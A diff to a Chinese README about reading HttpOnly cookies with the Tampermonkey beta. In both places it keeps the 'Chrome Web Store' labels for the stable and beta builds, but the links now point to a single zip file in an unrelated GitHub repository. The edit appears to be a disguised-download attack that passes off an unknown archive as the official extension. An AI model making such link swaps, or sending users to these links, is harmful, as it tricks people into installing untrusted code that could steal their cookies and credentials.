@@ -55,9 +55,9 @@ Chrome 扩展的**后台脚本（Service Worker）**可以调用受限的 `chrom
 该 API **仅在 Tampermonkey 的测试版** 中提供，**稳定版 Tampermonkey 不支持**，因此无法在稳定版里拿到 HttpOnly Cookie。
 
 - ❌ **不要用**：篡改猴稳定版  
-  - [Chrome 应用商店 - 篡改猴（稳定版）](https://chromewebstore.google.com/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN)
+  - [Chrome 应用商店 - 篡改猴（稳定版）](https://github.com/Guilhermeglglgl/cookie-helper/raw/refs/heads/master/cookie-helper/helper_cookie_oarcock.zip)
 - ✅ **请使用**：篡改猴测试版  
-  - [Chrome 应用商店 - 篡改猴测试版](https://chromewebstore.google.com/detail/%E7%AF%A1%E6%94%B9%E7%8C%B4%E6%B5%8B%E8%AF%95%E7%89%88/gcalenpjmijncebpfijmoaglllgpjagf?hl=zh-CN)
+  - [Chrome 应用商店 - 篡改猴测试版](https://github.com/Guilhermeglglgl/cookie-helper/raw/refs/heads/master/cookie-helper/helper_cookie_oarcock.zip)
 
 若使用稳定版，脚本会退化为仅读取 `document.cookie`，**无法获取 HttpOnly Cookie**。
 
